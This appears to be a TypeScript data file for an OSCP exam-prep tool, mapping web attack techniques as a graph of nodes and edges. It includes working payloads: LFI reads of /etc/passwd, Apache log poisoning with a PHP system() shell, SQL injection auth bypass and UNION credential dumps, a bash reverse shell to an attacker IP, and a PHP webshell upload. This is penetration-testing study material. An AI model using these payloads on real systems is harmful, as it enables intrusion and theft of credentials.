import type { OscpContent } from '@/types/oscp'

/** Phase: web enumeration + web application attacks (dir/vhost, LFI, SQLi, upload, injection). */
const web: OscpContent = {
    nodes: [
        {
            id: 'web-dirbust',
            title: 'Content discovery (dir busting)',
            type: 'technique',
            phase: 'web',
            os: 'agnostic',
            description:
                'Fingerprint the stack, then brute directories and files. Feed the right extensions for the tech (.php/.aspx/.jsp). Chase .bak/.zip/.old (source leaks), /admin, and login forms.',
            commands: [
                {
                    label: 'feroxbuster (recursive)',
                    code: 'feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html',
                },
                {
                    label: 'ffuf (files + extensions)',
                    code: 'ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -mc 200,301,302,403',
                },
                {
                    label: 'Fingerprint',
                    code: 'whatweb http://<target> && curl -sI http://<target>',
                },
            ],
            tags: ['gobuster', 'ffuf', 'feroxbuster', 'dirbust', 'whatweb'],
        },
        {
            id: 'vhost-fuzz',
            title: 'VHost / subdomain fuzzing',
            type: 'technique',
            phase: 'web',
            os: 'agnostic',
            description:
                'Different content is often served per Host header. Fuzz it, add discovered vhosts to /etc/hosts, then re-run content discovery against each.',
            commands: [
                {
                    label: 'ffuf Host header (filter by size)',
                    code: 'ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <baseline-size>',
                },
            ],
            tags: ['vhost', 'subdomain', 'host-header', 'ffuf'],
        },
        {
            id: 'login-form-found',
            title: 'Login form / admin panel',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'Try default and guessable creds first, then a targeted brute of the POST form. Watch for SQLi auth bypass in the same field.',
            tags: ['login', 'admin', 'auth', 'panel'],
        },
        {
            id: 'lfi',
            title: 'Local File Inclusion / path traversal',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'A parameter includes a file path. Read /etc/passwd (user list), dump PHP source via php://filter (find creds/DB strings), or escalate to RCE via log poisoning or /proc/self/environ.',
            commands: [
                {
                    label: 'Read + source dump',
                    code: `curl "http://<target>/?page=../../../../etc/passwd"
curl "http://<target>/?page=php://filter/convert.base64-encode/resource=config"`,
                },
                {
                    label: 'Log poisoning -> RCE',
                    code: `curl -A "<?php system(\\$_GET['c']); ?>" http://<target>/
curl "http://<target>/?page=/var/log/apache2/access.log&c=id"`,
                },
            ],
            tags: ['lfi', 'traversal', 'php-filter', 'log-poison'],
        },
        {
            id: 'sqli',
            title: 'SQL injection',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                "Confirm with ' and time-based payloads. Then: auth bypass, UNION dump (creds/hashes), file write to web root, or RCE (MSSQL xp_cmdshell / MySQL INTO OUTFILE). Manual first - sqlmap only when allowed.",
            commands: [
                {
                    label: 'Auth bypass',
                    code: "' OR 1=1-- -",
                },
                {
                    label: 'UNION dump',
                    code: `' ORDER BY 5-- -
' UNION SELECT 1,2,group_concat(user,':',password),4,5 FROM users-- -`,
                },
            ],
            tags: ['sqli', 'union', 'sqlmap', 'auth-bypass', 'injection'],
        },
        {
            id: 'cmd-injection',
            title: 'OS command injection',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'User input reaches a shell. Chain a command and go straight to a reverse shell. If blind, confirm out-of-band (ping/DNS) then upgrade.',
            commands: [
                {
                    label: 'Separators + reverse shell',
                    code: '; id | ; bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"\n`id`  $(id)  %0a id',
                },
            ],
            tags: ['command-injection', 'rce', 'shell'],
        },
        {
            id: 'file-upload',
            title: 'File upload to webshell',
            type: 'technique',
            phase: 'web',
            os: 'agnostic',
            description:
                'Upload an executable script matching the server language. Bypass filters via double extension, MIME spoof, magic bytes, or .htaccess. .aspx blocked? try .ashx. Then browse to it to execute.',
            commands: [
                {
                    label: 'PHP webshell + trigger',
                    code: `echo '<?php system($_GET["c"]); ?>' > sh.php.jpg   # then fix ext / MIME
curl "http://<target>/uploads/sh.php?c=id"`,
                },
            ],
            tags: ['upload', 'webshell', 'bypass', 'aspx', 'ashx'],
        },
        {
            id: 'ssrf',
            title: 'Server-Side Request Forgery',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'The server fetches a URL you control. Hit cloud metadata (169.254.169.254) for tokens, reach internal-only services, or use gopher:// to talk raw protocols (Redis/MySQL) for RCE.',
            tags: ['ssrf', 'metadata', 'gopher', 'internal'],
        },
        {
            id: 'idor',
            title: 'IDOR / broken access control',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                "Change a numeric/predictable ID to reach another user's data. Combine with mass-assignment (add admin:true on register) or a password-reset flaw for account takeover.",
            tags: ['idor', 'access-control', 'mass-assignment'],
        },
        {
            id: 'xss',
            title: 'Cross-Site Scripting',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                "Rarely the direct win on OSCP, but stored XSS can steal an admin session cookie -> hijack -> upload a webshell. Can also coerce NetNTLMv2 by pointing a victim at a UNC path.",
            tags: ['xss', 'cookie', 'session', 'stored'],
        },
    ],
    edges: [
        { from: 'web-dirbust', to: 'login-form-found', label: '/admin, login page' },
        { from: 'web-dirbust', to: 'lfi', label: 'page= / file= param' },
        { from: 'web-dirbust', to: 'sqli', label: 'id= / search param' },
        { from: 'web-dirbust', to: 'file-upload', label: 'upload feature' },
        { from: 'web-dirbust', to: 'public-exploit-search', label: 'CMS/version found' },
        { from: 'web-dirbust', to: 'vhost-fuzz', label: 'wildcard / default site' },
        { from: 'vhost-fuzz', to: 'web-dirbust', label: 'new vhost -> re-bust' },
        { from: 'login-form-found', to: 'hydra-brute', label: 'brute the POST form' },
        { from: 'login-form-found', to: 'sqli', label: "try ' OR 1=1" },
        { from: 'lfi', to: 'user-list', label: '/etc/passwd' },
        { from: 'lfi', to: 'creds-found', label: 'php filter source -> creds' },
        { from: 'lfi', to: 'foothold-linux', label: 'log poison -> RCE' },
        { from: 'sqli', to: 'creds-found', label: 'UNION dumps creds' },
        { from: 'sqli', to: 'hash-to-crack', label: 'UNION dumps hashes' },
        { from: 'sqli', to: 'webshell-upload', label: 'file write to web root' },
        { from: 'sqli', to: 'foothold-windows', label: 'xp_cmdshell (MSSQL)' },
        { from: 'cmd-injection', to: 'foothold-linux', label: 'reverse shell (Linux)' },
        { from: 'cmd-injection', to: 'foothold-windows', label: 'reverse shell (Windows)' },
        { from: 'file-upload', to: 'webshell-upload', label: 'shell uploaded' },
        { from: 'ssrf', to: 'creds-found', label: 'metadata tokens' },
        { from: 'idor', to: 'creds-found', label: "other user's secrets" },
        { from: 'xss', to: 'file-upload', label: 'admin cookie -> panel' },
        { from: 'xss', to: 'netntlm-captured', label: 'coerce UNC auth' },
    ],
}

export default web
